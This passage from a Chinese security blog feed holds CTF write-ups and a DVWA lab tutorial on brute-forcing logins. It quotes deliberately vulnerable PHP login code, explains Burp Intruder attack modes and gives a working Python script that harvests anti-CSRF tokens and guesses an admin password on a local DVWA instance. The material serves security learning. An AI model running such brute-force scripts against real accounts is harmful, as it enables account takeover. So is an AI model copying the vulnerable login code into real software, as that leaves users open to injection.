class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s=<span class="built_in">int</span>(ciphertext[i])-<span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s=<span class="built_in">int</span>(ciphertext[i])+<span class="number">10</span></span><br><span class="line">    s^=i</span><br><span class="line">    flag+=<span class="built_in">chr</span>(s)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到</p><p>flag{Y@e_Cl3veR_C1Ever!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-我吃三明治</title>
    <link href="https://blog.pillar.fun/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/"/>
    <id>https://blog.pillar.fun/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/</id>
    <published>2020-04-02T04:04:42.000Z</published>
    <updated>2022-04-02T07:34:19.553Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h1><p>开局一张jpg，用010edito打开</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/1.jpg" alt="img"></p><p>发现unknownpadding，开到FF D8 和JFIF，可知是另一张图片，保存出来，发现是同一张图靠的近了一点</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/2.jpg" alt="img"></p><p>而unknownpadding中间还有一段，看起来是base32，也确实是。</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/3.jpg" alt="img"></p><p>flag{6f1797d4080b29b64da5897780463e30}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>brute_force</title>
    <link href="https://blog.pillar.fun/2020/04/01/brute-force/"/>
    <id>https://blog.pillar.fun/2020/04/01/brute-force/</id>
    <published>2020-04-01T11:28:55.000Z</published>
    <updated>2021-03-12T12:42:14.158Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>DVWA（damn vulnerable web application）是学习web安全的非常简单愉快的入门手段，今天先总结一下暴破（Bruteforce）</p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以这么说，啥也不是。<br><img src="/2020/04/01/brute-force/1.jpg" alt><br>直接拿burpsuit暴破。抓到包后送到intruder<br><img src="/2020/04/01/brute-force/2.jpg" alt><br>在position选中要暴破的地方<br><img src="/2020/04/01/brute-force/3.jpg" alt><br>并且选择模式。intruder有四个模式，各种模式的攻击方式如下<br>1、Sniper：接受一个payload，payload每次只替换一个position<br>2、Battering ram：接受一个payload，payload每次将所有position替换<br>3、pitchfork：接受多个payload，第一个换第一个position的，第二个换第二个position的……以此类推，且同时换<br>4、cluster bomb：接受多个payload，第一个换第一个position的，第二个换第二个position的……以此类推，一次只换一个位置。</p><p>举个例子，就比如我们选中了username=$123$password=$456$<br>在sniper和battering ram模式下，只能接受一个payload，我们假设字典是 111,222,333,444……<br>于是sniper会这样攻击</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>111</td><td>456</td></tr><tr><td>222</td><td>456</td></tr><tr><td>……</td><td>……</td></tr><tr><td>123</td><td>111</td></tr><tr><td>123</td><td>222</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>而battering ram会这样</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>111</td><td>111</td></tr><tr><td>222</td><td>222</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>在pitchfork和cluster bomb的模式下，接受两个payload，假设第一个字典是111,222,333,444…… 第二个字典是aaa,bbb,ccc,ddd……<br>pitchfork会这样</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>111</td><td>aaa</td></tr><tr><td>222</td><td>bbb</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>在cluster bomb会这样</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>111</td><td>aaa</td></tr><tr><td>111</td><td>bbb</td></tr><tr><td>111</td><td>……</td></tr><tr><td>222</td><td>aaa</td></tr><tr><td>222</td><td>bbb</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>在payload选择字典，这里可以直接用他提供的一些字典，或者自己设置一个字典。<br>在平时搞暴破的时候可以使用一些工具生成一些个性化的字典。<br>ctf题大多会给你一个小字典让你快快跑完快快结束。<br>然后start attack即可，在获得的响应包里按状态码和长度筛选即可得到正确的密码<br><img src="/2020/04/01/brute-force/4.jpg" alt><br><img src="/2020/04/01/brute-force/5.jpg" alt></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>看下源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以这么说，加了个过滤sql注入的。<br>然而我们在low的时候也并没有使用sql注入，因此可以在low的方法依旧适用。<br>不过他加了个login failed就sleep2，但也只是时间长短罢了。</p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到有一个generateSessionToken也就是我们发的包里的user_token<br><img src="/2020/04/01/brute-force/6.jpg" alt><br>而在查看源码的时候也可以找到一个hidden的user_token<br>这里我们还是可以用burp，但是由于每次的token不一样，且由于burp的机制，必须要用pitchfork模式，这也就导致不能很合理的同时暴破两个地方。而且user_token是在response里直接可以看到的，因此我建议使用脚本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">        &#39;GET&#39;: &#39;http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F; HTTP&#x2F;1.1&#39;,</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko&#x2F;20100101 Firefox&#x2F;65.0&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&#39;,</span><br><span class="line">        &#39;Referer&#39;:&#39;http:&#x2F;&#x2F;localhost&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;&#39;,</span><br><span class="line">        &#39;cookie&#39;:&#39;PHPSESSID&#x3D;8fbhto539r4fnjt4dduolvikj3; security&#x3D;high&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;keep-alive&#39;,</span><br><span class="line">        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;,</span><br><span class="line">         &#39;Host&#39;:&#39;127.0.0.1&#39;</span><br><span class="line">        &#125;</span><br><span class="line">requrl&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">    response&#x3D;requests.get(url&#x3D;requrl,headers&#x3D;header)</span><br><span class="line">    print (response.status_code,len(response.content))</span><br><span class="line">    soup&#x3D;BeautifulSoup(response.text,&quot;html.parser&quot;)</span><br><span class="line">    input&#x3D;soup.form.select(&quot;input[type&#x3D;&#39;hidden&#39;]&quot;)   #返回的是一个list列表</span><br><span class="line">    user_token&#x3D;input[0][&#39;value&#39;]                   #获取用户的token</span><br><span class="line">    return user_token</span><br><span class="line"></span><br><span class="line">user_token&#x3D;get_token(requrl,header)</span><br><span class="line">i&#x3D;0</span><br><span class="line">for line in open(&quot;password.txt&quot;):</span><br><span class="line">    requrl&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;?username&#x3D;admin&amp;password&#x3D;&quot;+line.strip()+&quot;&amp;Login&#x3D;Login&amp;user_token&#x3D;&quot;+user_token</span><br><span class="line">    i&#x3D;i+1</span><br><span class="line">    print (i , &#39;admin&#39; ,line.strip(),end&#x3D;&quot;  &quot;)</span><br><span class="line">    user_token&#x3D;get_token(requrl,header)</span><br><span class="line">    # 尝试次数</span><br><span class="line">    if(i&#x3D;&#x3D;20):</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>确实impossible,主要你失败了他会挺lockout_time，虽然讲道理这你暴破暴几天几夜也不是不可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="variable">$timenow</span>    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span 